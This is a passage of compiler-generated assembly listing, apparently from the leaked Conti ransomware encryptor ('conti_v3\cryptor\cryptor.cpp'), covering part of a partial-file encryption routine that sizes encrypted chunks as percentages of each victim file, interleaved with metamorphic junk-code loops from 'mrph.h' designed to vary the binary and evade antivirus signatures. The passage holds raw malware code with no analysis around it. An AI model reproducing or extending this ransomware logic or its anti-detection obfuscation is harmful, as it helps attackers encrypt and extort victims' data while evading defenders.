  00c60	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$10[rbp-81]
  00c63	83 c1 02	 add	 ecx, 2
  00c66	41 03 cc	 add	 ecx, r12d
  00c69	89 4d df	 mov	 DWORD PTR _morph_var$10[rbp-81], ecx

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  00c6c	8b 45 df	 mov	 eax, DWORD PTR _morph_var$10[rbp-81]
  00c6f	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  00c74	7d 07		 jge	 SHORT $LN1183@EncryptPar
  00c76	ff c8		 dec	 eax
  00c78	83 c8 fc	 or	 eax, -4
  00c7b	ff c0		 inc	 eax
$LN1183@EncryptPar:
  00c7d	85 c0		 test	 eax, eax
  00c7f	0f 85 ab 07 00
	00		 jne	 $LN378@EncryptPar
  00c85	66 66 66 0f 1f
	84 00 00 00 00
	00		 npad	 11
$LL476@EncryptPar:
  00c90	8b 45 df	 mov	 eax, DWORD PTR _morph_var$10[rbp-81]
  00c93	ff c0		 inc	 eax
  00c95	89 45 df	 mov	 DWORD PTR _morph_var$10[rbp-81], eax
  00c98	8b 45 df	 mov	 eax, DWORD PTR _morph_var$10[rbp-81]
  00c9b	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  00ca0	7d 07		 jge	 SHORT $LN1182@EncryptPar
  00ca2	ff c8		 dec	 eax
  00ca4	83 c8 fc	 or	 eax, -4
  00ca7	ff c0		 inc	 eax
$LN1182@EncryptPar:
  00ca9	85 c0		 test	 eax, eax
  00cab	74 e3		 je	 SHORT $LL476@EncryptPar

; 51   : 	}

  00cad	e9 7e 07 00 00	 jmp	 $LN378@EncryptPar
$LN484@EncryptPar:

; 52   : 	else if (_morph_var % 2) {

  00cb2	8b 45 df	 mov	 eax, DWORD PTR _morph_var$10[rbp-81]

; 53   : 		_morph_var -= (int)a - 2;

  00cb5	b9 02 00 00 00	 mov	 ecx, 2
  00cba	8b 45 df	 mov	 eax, DWORD PTR _morph_var$10[rbp-81]
  00cbd	41 2b cc	 sub	 ecx, r12d
  00cc0	03 c8		 add	 ecx, eax

; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  00cc2	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00cc7	89 4d df	 mov	 DWORD PTR _morph_var$10[rbp-81], ecx
  00cca	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$10[rbp-81]
  00ccd	f7 e9		 imul	 ecx
  00ccf	8b c2		 mov	 eax, edx
  00cd1	c1 e8 1f	 shr	 eax, 31
  00cd4	03 d0		 add	 edx, eax
  00cd6	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00cd9	3b c8		 cmp	 ecx, eax
  00cdb	0f 85 4f 07 00
	00		 jne	 $LN378@EncryptPar
  00ce1	0f 1f 40 00 66
	66 66 0f 1f 84
	00 00 00 00 00	 npad	 15
$LL478@EncryptPar:
  00cf0	8b 45 df	 mov	 eax, DWORD PTR _morph_var$10[rbp-81]
  00cf3	ff c0		 inc	 eax
  00cf5	89 45 df	 mov	 DWORD PTR _morph_var$10[rbp-81], eax
  00cf8	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00cfd	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$10[rbp-81]
  00d00	f7 e9		 imul	 ecx
  00d02	8b c2		 mov	 eax, edx
  00d04	c1 e8 1f	 shr	 eax, 31
  00d07	03 d0		 add	 edx, eax
  00d09	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00d0c	3b c8		 cmp	 ecx, eax
  00d0e	74 e0		 je	 SHORT $LL478@EncryptPar

; 55   : 	}

  00d10	e9 1b 07 00 00	 jmp	 $LN378@EncryptPar
$LN16@EncryptPar:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1048 : 		PartSize = (FileInfo->FileSize / 100) * 10;

  00d15	48 b8 0b d7 a3
	70 3d 0a d7 a3	 mov	 rax, -6640827866535438581 ; a3d70a3d70a3d70bH
  00d1f	48 f7 6f 10	 imul	 QWORD PTR [rdi+16]
  00d23	48 03 57 10	 add	 rdx, QWORD PTR [rdi+16]
  00d27	48 c1 fa 06	 sar	 rdx, 6
  00d2b	48 8b c2	 mov	 rax, rdx
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 40   : 	volatile int _morph_var = static_cast<int>(1 + MetaRandom2<0, 0x7FFFFF - 1>::value);

  00d2e	c7 45 df c1 9b
	17 00		 mov	 DWORD PTR _morph_var$11[rbp-81], 1547201 ; 00179bc1H

; 48   : 	if (_morph_var % 3) {

  00d35	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$11[rbp-81]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1048 : 		PartSize = (FileInfo->FileSize / 100) * 10;

  00d38	48 c1 e8 3f	 shr	 rax, 63			; 0000003fH
  00d3c	48 03 d0	 add	 rdx, rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 48   : 	if (_morph_var % 3) {

  00d3f	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1048 : 		PartSize = (FileInfo->FileSize / 100) * 10;

  00d44	4c 8d 3c 92	 lea	 r15, QWORD PTR [rdx+rdx*4]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 48   : 	if (_morph_var % 3) {

  00d48	f7 e9		 imul	 ecx
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1048 : 		PartSize = (FileInfo->FileSize / 100) * 10;

  00d4a	4d 03 ff	 add	 r15, r15
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 48   : 	if (_morph_var % 3) {

  00d4d	8b c2		 mov	 eax, edx
  00d4f	c1 e8 1f	 shr	 eax, 31
  00d52	03 d0		 add	 edx, eax
  00d54	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00d57	3b c8		 cmp	 ecx, eax
  00d59	74 44		 je	 SHORT $LN463@EncryptPar

; 49   : 		_morph_var += (int)a + 2;

  00d5b	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$11[rbp-81]
  00d5e	83 c1 02	 add	 ecx, 2
  00d61	41 03 cf	 add	 ecx, r15d
  00d64	89 4d df	 mov	 DWORD PTR _morph_var$11[rbp-81], ecx

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  00d67	8b 45 df	 mov	 eax, DWORD PTR _morph_var$11[rbp-81]
  00d6a	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  00d6f	7d 07		 jge	 SHORT $LN1180@EncryptPar
  00d71	ff c8		 dec	 eax
  00d73	83 c8 fc	 or	 eax, -4
  00d76	ff c0		 inc	 eax
$LN1180@EncryptPar:
  00d78	85 c0		 test	 eax, eax
  00d7a	75 74		 jne	 SHORT $LN462@EncryptPar
  00d7c	0f 1f 40 00	 npad	 4
$LL455@EncryptPar:
  00d80	8b 45 df	 mov	 eax, DWORD PTR _morph_var$11[rbp-81]
  00d83	ff c0		 inc	 eax
  00d85	89 45 df	 mov	 DWORD PTR _morph_var$11[rbp-81], eax
  00d88	8b 45 df	 mov	 eax, DWORD PTR _morph_var$11[rbp-81]
  00d8b	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  00d90	7d 07		 jge	 SHORT $LN1179@EncryptPar
  00d92	ff c8		 dec	 eax
  00d94	83 c8 fc	 or	 eax, -4
  00d97	ff c0		 inc	 eax
$LN1179@EncryptPar:
  00d99	85 c0		 test	 eax, eax
  00d9b	74 e3		 je	 SHORT $LL455@EncryptPar

; 51   : 	}

  00d9d	eb 51		 jmp	 SHORT $LN462@EncryptPar
$LN463@EncryptPar:

; 52   : 	else if (_morph_var % 2) {

  00d9f	8b 45 df	 mov	 eax, DWORD PTR _morph_var$11[rbp-81]

; 53   : 		_morph_var -= (int)a - 2;

  00da2	b9 02 00 00 00	 mov	 ecx, 2
  00da7	8b 45 df	 mov	 eax, DWORD PTR _morph_var$11[rbp-81]
  00daa	41 2b cf	 sub	 ecx, r15d
  00dad	03 c8		 add	 ecx, eax

; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  00daf	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00db4	89 4d df	 mov	 DWORD PTR _morph_var$11[rbp-81], ecx
  00db7	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$11[rbp-81]
  00dba	f7 e9		 imul	 ecx
  00dbc	8b c2		 mov	 eax, edx
  00dbe	c1 e8 1f	 shr	 eax, 31
  00dc1	03 d0		 add	 edx, eax
  00dc3	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00dc6	3b c8		 cmp	 ecx, eax
  00dc8	75 26		 jne	 SHORT $LN462@EncryptPar
  00dca	66 0f 1f 44 00
	00		 npad	 6
$LL457@EncryptPar:
  00dd0	8b 45 df	 mov	 eax, DWORD PTR _morph_var$11[rbp-81]
  00dd3	ff c0		 inc	 eax
  00dd5	89 45 df	 mov	 DWORD PTR _morph_var$11[rbp-81], eax
  00dd8	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00ddd	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$11[rbp-81]
  00de0	f7 e9		 imul	 ecx
  00de2	8b c2		 mov	 eax, edx
  00de4	c1 e8 1f	 shr	 eax, 31
  00de7	03 d0		 add	 edx, eax
  00de9	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00dec	3b c8		 cmp	 ecx, eax
  00dee	74 e0		 je	 SHORT $LL457@EncryptPar
$LN462@EncryptPar:

; 40   : 	volatile int _morph_var = static_cast<int>(1 + MetaRandom2<0, 0x7FFFFF - 1>::value);

  00df0	c7 45 df c1 9b
	17 00		 mov	 DWORD PTR _morph_var$12[rbp-81], 1547201 ; 00179bc1H

; 48   : 	if (_morph_var % 3) {

  00df7	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00dfc	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$12[rbp-81]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1051 : 		StepSize = PartSize;

  00dff	4d 8b e7	 mov	 r12, r15
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 48   : 	if (_morph_var % 3) {

  00e02	f7 e9		 imul	 ecx
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1050 : 		StepsCount = 5;

  00e04	c7 45 e3 05 00
	00 00		 mov	 DWORD PTR StepsCount$1$[rbp-81], 5
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 48   : 	if (_morph_var % 3) {

  00e0b	8b c2		 mov	 eax, edx
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1051 : 		StepSize = PartSize;

  00e0d	4c 89 7d e7	 mov	 QWORD PTR StepSize$1$[rbp-81], r15
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 48   : 	if (_morph_var % 3) {

  00e11	c1 e8 1f	 shr	 eax, 31
  00e14	03 d0		 add	 edx, eax
  00e16	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00e19	3b c8		 cmp	 ecx, eax
  00e1b	74 55		 je	 SHORT $LN442@EncryptPar

; 49   : 		_morph_var += (int)a + 2;

  00e1d	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$12[rbp-81]
  00e20	83 c1 02	 add	 ecx, 2
  00e23	41 03 cf	 add	 ecx, r15d
  00e26	89 4d df	 mov	 DWORD PTR _morph_var$12[rbp-81], ecx

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  00e29	8b 45 df	 mov	 eax, DWORD PTR _morph_var$12[rbp-81]
  00e2c	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  00e31	7d 07		 jge	 SHORT $LN1177@EncryptPar
  00e33	ff c8		 dec	 eax
  00e35	83 c8 fc	 or	 eax, -4
  00e38	ff c0		 inc	 eax
$LN1177@EncryptPar:
  00e3a	85 c0		 test	 eax, eax
  00e3c	0f 85 ee 05 00
	00		 jne	 $LN378@EncryptPar
  00e42	0f 1f 40 00 66
	66 0f 1f 84 00
	00 00 00 00	 npad	 14
$LL434@EncryptPar:
  00e50	8b 45 df	 mov	 eax, DWORD PTR _morph_var$12[rbp-81]
  00e53	ff c0		 inc	 eax
  00e55	89 45 df	 mov	 DWORD PTR _morph_var$12[rbp-81], eax
  00e58	8b 45 df	 mov	 eax, DWORD PTR _morph_var$12[rbp-81]
  00e5b	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  00e60	7d 07		 jge	 SHORT $LN1176@EncryptPar
  00e62	ff c8		 dec	 eax
  00e64	83 c8 fc	 or	 eax, -4
  00e67	ff c0		 inc	 eax
$LN1176@EncryptPar:
  00e69	85 c0		 test	 eax, eax
  00e6b	74 e3		 je	 SHORT $LL434@EncryptPar

; 51   : 	}

  00e6d	e9 be 05 00 00	 jmp	 $LN378@EncryptPar
$LN442@EncryptPar:

; 52   : 	else if (_morph_var % 2) {

  00e72	8b 45 df	 mov	 eax, DWORD PTR _morph_var$12[rbp-81]

; 53   : 		_morph_var -= (int)a - 2;

  00e75	b9 02 00 00 00	 mov	 ecx, 2
  00e7a	8b 45 df	 mov	 eax, DWORD PTR _morph_var$12[rbp-81]
  00e7d	41 2b cf	 sub	 ecx, r15d
  00e80	03 c8		 add	 ecx, eax

; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  00e82	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00e87	89 4d df	 mov	 DWORD PTR _morph_var$12[rbp-81], ecx
  00e8a	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$12[rbp-81]
  00e8d	f7 e9		 imul	 ecx
  00e8f	8b c2		 mov	 eax, edx
  00e91	c1 e8 1f	 shr	 eax, 31
  00e94	03 d0		 add	 edx, eax
  00e96	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00e99	3b c8		 cmp	 ecx, eax
  00e9b	0f 85 8f 05 00
	00		 jne	 $LN378@EncryptPar
  00ea1	0f 1f 40 00 66
	66 66 0f 1f 84
	00 00 00 00 00	 npad	 15
$LL436@EncryptPar:
  00eb0	8b 45 df	 mov	 eax, DWORD PTR _morph_var$12[rbp-81]
  00eb3	ff c0		 inc	 eax
  00eb5	89 45 df	 mov	 DWORD PTR _morph_var$12[rbp-81], eax
  00eb8	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00ebd	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$12[rbp-81]
  00ec0	f7 e9		 imul	 ecx
  00ec2	8b c2		 mov	 eax, edx
  00ec4	c1 e8 1f	 shr	 eax, 31
  00ec7	03 d0		 add	 edx, eax
  00ec9	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00ecc	3b c8		 cmp	 ecx, eax
  00ece	74 e0		 je	 SHORT $LL436@EncryptPar

; 55   : 	}

  00ed0	e9 5b 05 00 00	 jmp	 $LN378@EncryptPar
$LN17@EncryptPar:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1056 : 		PartSize = (FileInfo->FileSize / 100) * 20;

  00ed5	48 b8 0b d7 a3
	70 3d 0a d7 a3	 mov	 rax, -6640827866535438581 ; a3d70a3d70a3d70bH
  00edf	48 f7 6f 10	 imul	 QWORD PTR [rdi+16]
  00ee3	48 03 57 10	 add	 rdx, QWORD PTR [rdi+16]
  00ee7	48 c1 fa 06	 sar	 rdx, 6
  00eeb	48 8b c2	 mov	 rax, rdx
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 40   : 	volatile int _morph_var = static_cast<int>(1 + MetaRandom2<0, 0x7FFFFF - 1>::value);

  00eee	c7 45 df c1 9b
	17 00		 mov	 DWORD PTR _morph_var$13[rbp-81], 1547201 ; 00179bc1H

; 48   : 	if (_morph_var % 3) {

  00ef5	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$13[rbp-81]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1056 : 		PartSize = (FileInfo->FileSize / 100) * 20;

  00ef8	48 c1 e8 3f	 shr	 rax, 63			; 0000003fH
  00efc	48 03 d0	 add	 rdx, rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 48   : 	if (_morph_var % 3) {

  00eff	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1056 : 		PartSize = (FileInfo->FileSize / 100) * 20;

  00f04	4c 8d 3c 92	 lea	 r15, QWORD PTR [rdx+rdx*4]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 48   : 	if (_morph_var % 3) {

  00f08	f7 e9		 imul	 ecx
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1056 : 		PartSize = (FileInfo->FileSize / 100) * 20;

  00f0a	49 c1 e7 02	 shl	 r15, 2
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 48   : 	if (_morph_var % 3) {

  00f0e	8b c2		 mov	 eax, edx
  00f10	c1 e8 1f	 shr	 eax, 31
  00f13	03 d0		 add	 edx, eax
  00f15	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00f18	3b c8		 cmp	 ecx, eax
  00f1a	74 43		 je	 SHORT $LN421@EncryptPar

; 49   : 		_morph_var += (int)a + 2;

  00f1c	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$13[rbp-81]
  00f1f	83 c1 02	 add	 ecx, 2
  00f22	41 03 cf	 add	 ecx, r15d
  00f25	89 4d df	 mov	 DWORD PTR _morph_var$13[rbp-81], ecx

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  00f28	8b 45 df	 mov	 eax, DWORD PTR _morph_var$13[rbp-81]
  00f2b	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  00f30	7d 07		 jge	 SHORT $LN1174@EncryptPar
  00f32	ff c8		 dec	 eax
  00f34	83 c8 fc	 or	 eax, -4
  00f37	ff c0		 inc	 eax
$LN1174@EncryptPar:
  00f39	85 c0		 test	 eax, eax
  00f3b	75 73		 jne	 SHORT $LN420@EncryptPar
  00f3d	0f 1f 00	 npad	 3
$LL413@EncryptPar:
  00f40	8b 45 df	 mov	 eax, DWORD PTR _morph_var$13[rbp-81]
  00f43	ff c0		 inc	 eax
  00f45	89 45 df	 mov	 DWORD PTR _morph_var$13[rbp-81], eax
  00f48	8b 45 df	 mov	 eax, DWORD PTR _morph_var$13[rbp-81]
  00f4b	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  00f50	7d 07		 jge	 SHORT $LN1173@EncryptPar
  00f52	ff c8		 dec	 eax
  00f54	83 c8 fc	 or	 eax, -4
  00f57	ff c0		 inc	 eax
$LN1173@EncryptPar:
  00f59	85 c0		 test	 eax, eax
  00f5b	74 e3		 je	 SHORT $LL413@EncryptPar

; 51   : 	}

  00f5d	eb 51		 jmp	 SHORT $LN420@EncryptPar
$LN421@EncryptPar:

; 52   : 	else if (_morph_var % 2) {

  00f5f	8b 45 df	 mov	 eax, DWORD PTR _morph_var$13[rbp-81]

; 53   : 		_morph_var -= (int)a - 2;

  00f62	b9 02 00 00 00	 mov	 ecx, 2
  00f67	8b 45 df	 mov	 eax, DWORD PTR _morph_var$13[rbp-81]
  00f6a	41 2b cf	 sub	 ecx, r15d
  00f6d	03 c8		 add	 ecx, eax

; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  00f6f	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00f74	89 4d df	 mov	 DWORD PTR _morph_var$13[rbp-81], ecx
  00f77	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$13[rbp-81]
  00f7a	f7 e9		 imul	 ecx
  00f7c	8b c2		 mov	 eax, edx
  00f7e	c1 e8 1f	 shr	 eax, 31
  00f81	03 d0		 add	 edx, eax
  00f83	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00f86	3b c8		 cmp	 ecx, eax
  00f88	75 26		 jne	 SHORT $LN420@EncryptPar
  00f8a	66 0f 1f 44 00
	00		 npad	 6
$LL415@EncryptPar:
  00f90	8b 45 df	 mov	 eax, DWORD PTR _morph_var$13[rbp-81]
  00f93	ff c0		 inc	 eax
  00f95	89 45 df	 mov	 DWORD PTR _morph_var$13[rbp-81], eax
  00f98	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00f9d	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$13[rbp-81]
  00fa0	f7 e9		 imul	 ecx
  00fa2	8b c2		 mov	 eax, edx
  00fa4	c1 e8 1f	 shr	 eax, 31
  00fa7	03 d0		 add	 edx, eax
  00fa9	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00fac	3b c8		 cmp	 ecx, eax
  00fae	74 e0		 je	 SHORT $LL415@EncryptPar
$LN420@EncryptPar:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1059 : 		StepSize = (FileInfo->FileSize - (PartSize * 3)) / 2;

  00fb0	48 8b 47 10	 mov	 rax, QWORD PTR [rdi+16]
  00fb4	4b 8d 0c 7f	 lea	 rcx, QWORD PTR [r15+r15*2]
  00fb8	48 2b c1	 sub	 rax, rcx
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 40   : 	volatile int _morph_var = static_cast<int>(1 + MetaRandom2<0, 0x7FFFFF - 1>::value);

  00fbb	c7 45 df c1 9b
	17 00		 mov	 DWORD PTR _morph_var$14[rbp-81], 1547201 ; 00179bc1H

; 48   : 	if (_morph_var % 3) {

  00fc2	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$14[rbp-81]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1059 : 		StepSize = (FileInfo->FileSize - (PartSize * 3)) / 2;

  00fc5	48 99		 cdq
  00fc7	48 2b c2	 sub	 rax, rdx
  00fca	c7 45 e3 03 00
	00 00		 mov	 DWORD PTR StepsCount$1$[rbp-81], 3
  00fd1	48 d1 f8	 sar	 rax, 1
  00fd4	4c 8b e0	 mov	 r12, rax
  00fd7	48 89 45 e7	 mov	 QWORD PTR StepSize$1$[rbp-81], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 48   : 	if (_morph_var % 3) {

  00fdb	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00fe0	f7 e9		 imul	 ecx
  00fe2	8b c2		 mov	 eax, edx
  00fe4	c1 e8 1f	 shr	 eax, 31
  00fe7	03 d0		 add	 edx, eax
  00fe9	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00fec	3b c8		 cmp	 ecx, eax
  00fee	74 52		 je	 SHORT $LN400@EncryptPar

; 49   : 		_morph_var += (int)a + 2;

  00ff0	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$14[rbp-81]
  00ff3	83 c1 02	 add	 ecx, 2
  00ff6	41 03 cc	 add	 ecx, r12d
  00ff9	89 4d df	 mov	 DWORD PTR _morph_var$14[rbp-81], ecx

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  00ffc	8b 45 df	 mov	 eax, DWORD PTR _morph_var$14[rbp-81]
  00fff	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  01004	7d 07		 jge	 SHORT $LN1171@EncryptPar
  01006	ff c8		 dec	 eax
  01008	83 c8 fc	 or	 eax, -4
  0100b	ff c0		 inc	 eax
$LN1171@EncryptPar:
  0100d	85 c0		 test	 eax, eax
  0100f	0f 85 1b 04 00
	00		 jne	 $LN378@EncryptPar
  01015	66 66 66 0f 1f
	84 00 00 00 00
	00		 npad	 11
$LL392@EncryptPar:
  01020	8b 45 df	 mov	 eax, DWORD PTR _morph_var$14[rbp-81]
  01023	ff c0		 inc	 eax
  01025	89 45 df	 mov	 DWORD PTR _morph_var$14[rbp-81], eax
  01028	8b 45 df	 mov	 eax, DWORD PTR _morph_var$14[rbp-81]
  0102b	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  01030	7d 07		 jge	 SHORT $LN1170@EncryptPar
  01032	ff c8		 dec	 eax
  01034	83 c8 fc	 or	 eax, -4
  01037	ff c0		 inc	 eax
$LN1170@EncryptPar:
  01039	85 c0		 test	 eax, eax
  0103b	74 e3		 je	 SHORT $LL392@EncryptPar

; 51   : 	}

  0103d	e9 ee 03 00 00	 jmp	 $LN378@EncryptPar
$LN400@EncryptPar:

; 52   : 	else if (_morph_var % 2) {

  01042	8b 45 df	 mov	 eax, DWORD PTR _morph_var$14[rbp-81]

; 53   : 		_morph_var -= (int)a - 2;

  01045	b9 02 00 00 00	 mov	 ecx, 2
  0104a	8b 45 df	 mov	 eax, DWORD PTR _morph_var$14[rbp-81]
  0104d	41 2b cc	 sub	 ecx, r12d
  01050	03 c8		 add	 ecx, eax

; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  01052	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  01057	89 4d df	 mov	 DWORD PTR _morph_var$14[rbp-81], ecx
  0105a	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$14[rbp-81]
  0105d	f7 e9		 imul	 ecx
  0105f	8b c2		 mov	 eax, edx
  01061	c1 e8 1f	 shr	 eax, 31
  01064	03 d0		 add	 edx, eax
  01066	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  01069	3b c8		 cmp	 ecx, eax
  0106b	0f 85 bf 03 00
	00		 jne	 $LN378@EncryptPar
  01071	0f 1f 40 00 66
	66 66 0f 1f 84
	00 00 00 00 00	 npad	 15
$LL394@EncryptPar:
  01080	8b 45 df	 mov	 eax, DWORD PTR _morph_var$14[rbp-81]
  01083	ff c0		 inc	 eax
  01085	89 45 df	 mov	 DWORD PTR _morph_var$14[rbp-81], eax
  01088	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  0108d	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$14[rbp-81]
  01090	f7 e9		 imul	 ecx
  01092	8b c2		 mov	 eax, edx
  01094	c1 e8 1f	 shr	 eax, 31
  01097	03 d0		 add	 edx, eax
  01099	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  0109c	3b c8		 cmp	 ecx, eax
  0109e	74 e0		 je	 SHORT $LL394@EncryptPar

; 55   : 	}

  010a0	e9 8b 03 00 00	 jmp	 $LN378@EncryptPar
$LN18@EncryptPar:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1064 : 		PartSize = (FileInfo->FileSize / 100) * 23;

  010a5	48 b8 0b d7 a3
	70 3d 0a d7 a3	 mov	 rax, -6640827866535438581 ; a3d70a3d70a3d70bH
  010af	48 f7 6f 10	 imul	 QWORD PTR [rdi+16]
  010b3	48 03 57 10	 add	 rdx, QWORD PTR [rdi+16]
  010b7	48 c1 fa 06	 sar	 rdx, 6
  010bb	48 8b c2	 mov	 rax, rdx
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 40   : 	volatile int _morph_var = static_cast<int>(1 + MetaRandom2<0, 0x7FFFFF - 1>::value);

  010be	c7 45 df c1 9b
	17 00		 mov	 DWORD PTR _morph_var$1[rbp-81], 1547201 ; 00179bc1H

; 48   : 	if (_morph_var % 3) {

  010c5	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$1[rbp-81]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1064 : 		PartSize = (FileInfo->FileSize / 100) * 23;

  010c8	48 c1 e8 3f	 shr	 rax, 63			; 0000003fH
  010cc	48 03 d0	 add	 rdx, rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 48   : 	if (_morph_var % 3) {

  010cf	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1064 : 		PartSize = (FileInfo->FileSize / 100) * 23;

  010d4	4c 6b fa 17	 imul	 r15, rdx, 23
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 48   : 	if (_morph_var % 3) {

  010d8	f7 e9		 imul	 ecx
  010da	8b c2		 mov	 eax, edx
  010dc	c1 e8 1f	 shr	 eax, 31
  010df	03 d0		 add	 edx, eax
  010e1	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  010e4	3b c8		 cmp	 ecx, eax
  010e6	74 47		 je	 SHORT $LN673@EncryptPar

; 49   : 		_morph_var += (int)a + 2;

  010e8	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$1[rbp-81]
  010eb	83 c1 02	 add	 ecx, 2
  010ee	41 03 cf	 add	 ecx, r15d
  010f1	89 4d df	 mov	 DWORD PTR _morph_var$1[rbp-81], ecx

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  010f4	8b 45 df	 mov	 eax, DWORD PTR _morph_var$1[rbp-81]
  010f7	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  010fc	7d 07		 jge	 SHORT $LN1168@EncryptPar
  010fe	ff c8		 dec	 eax
  01100	83 c8 fc	 or	 eax, -4
  01103	ff c0		 inc	 eax
$LN1168@EncryptPar:
  01105	85 c0		 test	 eax, eax
  01107	75 77		 jne	 SHORT $LN672@EncryptPar
  01109	0f 1f 80 00 00
	00 00		 npad	 7
$LL665@EncryptPar:
